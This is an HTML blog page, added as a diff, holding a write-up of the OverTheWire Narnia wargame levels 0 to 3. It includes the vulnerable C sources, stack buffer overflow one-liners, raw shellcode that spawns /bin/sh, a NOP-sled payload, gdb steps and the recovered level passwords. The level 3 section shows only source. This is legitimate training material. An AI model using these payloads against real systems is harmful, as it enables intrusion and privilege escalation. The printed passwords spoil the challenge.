@@ -1,0 +1,325 @@
+<!doctype html>
+<html lang="en" itemscope itemtype="http://schema.org/Person">
+<head>
+  <meta charset="utf-8">
+  <!-- Site Meta Data -->
+  <title>Write-ups for OTW-Narnia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="samarth">
+
+  <link rel="shortcut icon" href="">
+
+  <!-- schema.org -->
+  <meta itemprop="name" content="Diary of a Cybersec Enthusiast">
+  <meta itemprop="image" content="">
+  <meta itemprop="description" content="">
+
+  <!-- Style Meta Data -->
+  <link rel="stylesheet" href="/theme/css/milligram.css" type="text/css" />
+  <link rel="stylesheet" href="/theme/css/custom.css" type="text/css" />
+
+  <!-- Feed Meta Data -->
+
+  <!-- Twitter Feed -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="">
+  <meta name="twitter:image" content="">
+
+<meta name="twitter:creator" content="">
+<meta name="twitter:url" content="/write-ups-for-otw-narnia.html">
+<meta name="twitter:title" content="Diary of a Cybersec Enthusiast ~ Write-ups for OTW-Narnia">
+<meta name="twitter:description" content="narnia0 // gcc -m32 -fno-stack-protector -z execstack -no-pie -g -Wl,-z,norelro -O0 narnia2.c I executed the the narnia0 located at /narnia/ before looking at the source code. We are provided with an input buffer and the challenge wants us to change the value of some stored bytes. Lets try …">
+
+<!-- Facebook Meta Data -->
+<meta property="og:title" content="Diary of a Cybersec Enthusiast ~ Write-ups for OTW-Narnia" />
+<meta property="og:description" content="narnia0 // gcc -m32 -fno-stack-protector -z execstack -no-pie -g -Wl,-z,norelro -O0 narnia2.c I executed the the narnia0 located at /narnia/ before looking at the source code. We are provided with an input buffer and the challenge wants us to change the value of some stored bytes. Lets try …" />
+<meta property="og:image" content="" />
+</head>
+
+<body>
+    <div class="container">
+
+    <!-- Navbar -->
+      <div class="navbar">
+        <ul>
+            <div>
+                <li>
+                    <a href=""><h3>Diary of a Cybersec Enthusiast</h3></a>
+                </li>
+                <li>
+                </li>
+            </div>
+        </ul>
+      </div>
+
+  <!-- Sidebar -->
+    <sidebar>
+        <ul class="static-item">
+
+        </ul>        
+
+        <ul>
+                <div class="cat-border">
+                <li style="color: #F2F1EF; background-color: #6C7A89;">Categories</li>
+                    <li><a href="/category/malware-analysis.html">malware-analysis</a></li>
+                    <li><a href="/category/reverse-engineering.html">reverse-engineering</a></li>
+                    <li><a href="/category/uncategorized.html">uncategorized</a></li>
+                    <li><a href="/category/write-ups.html">write-ups</a></li>
+                </div>
+        </ul>
+
+            <h2><br/>BLOGROLLS</h2>
+            <ul>
+                    <li><a href="http://getpelican.com/">Pelican</a></li>
+                    <li><a href="http://python.org/">Python.org</a></li>
+                    <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
+            </ul> 
+   
+        <p> 
+                <span>
+                    <a href="https://github.com/samarthkathal" target="_blank">
+                        <img class="social-icons-m" src="/theme/images/icons/github.png">
+                    </a>
+                </span>
+                <span>
+                    <a href="https://twitter.com/samarth_kathal" target="_blank">
+                        <img class="social-icons-m" src="/theme/images/icons/twitter.png">
+                    </a>
+                </span>
+                <span>
+                    <a href="https://www.instagram.com/samarth.kathal/" target="_blank">
+                        <img class="social-icons-m" src="/theme/images/icons/instagram.png">
+                    </a>
+                </span>
+        </p>
+        <p>
+        </p>
+        <p>
+        </p>
+    </sidebar>
+    
+    <maincontent>
+<h2>
+    <a href="/write-ups-for-otw-narnia.html" rel="bookmark" title="Permalink to Write-ups for OTW-Narnia">Write-ups for OTW-Narnia</a>
+</h2>
+
+<div>
+    <b>By: </b><a href="/author/samarth.html">samarth</a><b>    On: </b>Fri 01 May 2020<br />
+    <b>In: </b><a href="/category/write-ups.html" rel="bookmark" title="Permalink to write-ups">write-ups</a><br />
+    <em><b>Tags: </b>
+                <span><a href="/tag/write-up.html">#write-up </a></span>
+    </em>
+    <hr>
+</div>
+
+<div>
+    <mainarticle>
+    <h2>narnia0</h2>
+<p>// gcc -m32 -fno-stack-protector -z execstack -no-pie -g -Wl,-z,norelro -O0 narnia2.c</p>
+<p>I executed the the narnia0 located at <code>/narnia/</code> before looking at the source code.</p>
+<p>We are provided with an input buffer and the challenge wants us to change the value of some stored bytes.</p>
+<p>Lets try to guess the size of input buffer (simple buffer overflow) by trial and error.</p>
+<p>looks like the buffer size is 20 and the buffer gets terminated by a null byte at the end as usual.</p>
+<p>heres a simple pyhton one-liner.</p>
+<div class="highlight"><pre><span></span><code>python -c <span class="s2">&quot;from pwn import *;print(cyclic(20)+struct.pack(&#39;&lt;Q&#39;, int(&#39;0xdeadbeef&#39;, base=16)))&quot;</span> <span class="p">|</span> ./narnia0
+</code></pre></div>
+
+
+<p>done.</p>
+<p>also, heres the source code.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">){</span>
+        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>But we weren't served the shell. This is an issue with bash. we need stdin control back to us. so,</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>python -c <span class="s2">&quot;from pwn import *;print(cyclic(20)+struct.pack(&#39;&lt;Q&#39;, int(&#39;0xdeadbeef&#39;, base=16)))&quot;</span><span class="p">;</span> cat<span class="p">;</span><span class="o">)</span> <span class="p">|</span> ./narnia0
+</code></pre></div>
+
+
+<p>we got the shell, but looking into it further, looks like struct.pack() is producing 4 null bytes which we dont need. Also, this code looks complicated.</p>
+<p>so,</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>python -c <span class="s1">&#39;print 20*&quot;A&quot; + &quot;\xef\xbe\xad\xde&quot;&#39;</span><span class="p">;</span> cat<span class="p">;</span><span class="o">)</span> <span class="p">|</span> ./narnia0
+</code></pre></div>
+
+
+<div class="highlight"><pre><span></span><code>cat /etc/narnia_pass/narnia1
+</code></pre></div>
+
+
+<p>password : efeidiedae</p>
+<p>and done</p>
+<h2>narnia1</h2>
+<p>sourcecode :</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
+    <span class="n">ret</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>it needs an environment variable named "EGG" which can be executed.
+I searched for random shellcode and finally this one worked.</p>
+<div class="highlight"><pre><span></span><code><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print(&#39;</span><span class="se">\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80</span><span class="s2">&#39;)&quot;</span><span class="err">`</span>
+</code></pre></div>
+
+
+<p>so, </p>
+<div class="highlight"><pre><span></span><code>cat /etc/narnia_pass/narnia2
+</code></pre></div>
+
+
+<p>password = nairiepecu</p>
+<p>next!</p>
+<h2>narnia2</h2>
+<p>source code :</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>looks like the buffer size is 128.
+this is a basic buffer overflow with no aslr and stacksmash enabled.
+setting breakpint at main() <code>b main</code></p>
+<p>Since this is a bufferover flow, lets analyse the program flow in depth. I will download the files from remote to local using <code>scp -P 2226 -r narnia2@narnia.labs.overthewire.org:/narnia/ .</code> and analyse it in <strong>cutter</strong> which is a GUI version of <strong>Radare2</strong>.</p>
+<p><img alt="cutter-narnia2" src="/static/images/otw-narnia2-cutter-1.png" title="cutter screenshot">
+<em>note : I have not disabled aslr on my local machine, The offset values might differ</em></p>
+<p>So, We have to overflow the stack. That is, Take control of the EIP register, Jump back to the buffer's beginning in the stack and take advantage of the stack being executable.</p>
+<p>Back at the narnia server, running the binary inside gdb with <code>python -c 'print("A"*128+"BBBB"+"CCCC")</code> and breaking the execution just before the buffer's address is loaded in eax and then pushed onto stack. ie, <code>b *0x0804847a</code>, we can determine the start of the buffer inside the stack with <code>info registers</code>. </p>
+<p>the buffer starts at <strong>eax=0xffffd816</strong></p>
+<p>just to be sure, lets print the stack values startin from <strong>0xffffd800</strong> <code>x/100x 0xffffd800</code>. as we can see, stack is filled with all A's which is 0x41 in hex.</p>
+<p>we have to inject a shellcode into the stack and execute it. the size of the shellcode will determine our exact payload. the payload will be of 136 bits in length out of which, last 4 bytes will be the return address which points back onto our payload on stack. most of the payload needs to be padded with NOPs(\x90).</p>
+<p>pad the initial 40 bits with \x90
+lets return onto <strong>0xffffd836</strong>
+the <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shellcode</a> is 23 bytes long</p>
+<p>pad1 = '\x90'<em>40
+shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+pad2 = '\x90'</em>69
+return_address = '\x36\xd8\xff\xff'</p>
+<p>final payload = pad1+shellcode+pad2+return_address</p>
+<p><code>python -c 'print("\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*69+"\x36\xd8\xff\xff")'</code> </p>
+<p>and we have a shell.</p>
+<p><code>cat /etc/narnia_pass/narnia3</code></p>
+<p>password = vaequeezee</p>
+<h2>narnia3</h2>
+<p>sourcecoe :</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+
+    <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* open files */</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* copy from file1 to file2 */</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>
+
+    <span class="cm">/* close &#39;em */</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>
+
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p><img alt="redacted" src="/static/images/uc.png" title="Under Construction"></p>
+    </mainarticle>
+</div>
+<hr>
+        
+<div>
+        <i>If you found the article helpful, please share or cite the article, and spread the word:</i>
+            <p style="margin-top: 2%;">
+                <span><a target="_blank" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=400,width=700');return false;" title="Twitter" href="https://twitter.com/share?url=/write-ups-for-otw-narnia.html&text=Write-ups for OTW-Narnia&via="><img class="social-icons-a" src="/theme/images/icons/twitter.png"></a></span>
+                <span><a target="_blank" title="Facebook" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=500,width=700');return false;" href="https://www.facebook.com/sharer.php?u=/write-ups-for-otw-narnia.html&t=Write-ups for OTW-Narnia"><img class="social-icons-a" src="/theme/images/icons/facebook.png"></a></span>
+
+                <span><a  target="_blank" title="Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=/write-ups-for-otw-narnia.html&title=Write-ups for OTW-Narnia" rel="nofollow" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=450,width=650');return false;"><img class="social-icons-a" src="/theme/images/icons/linkedin.png"></a></span>
+            </p>
+</div>
+<hr>
+    <p><i>For any feedback or corrections, please write in to: </i><b> samarthkathal@gmail.com </b></p>
+        
+    </maincontent>
+
+  <!-- Analytics -->
+
+  </div>
+</body>
+
+</html>
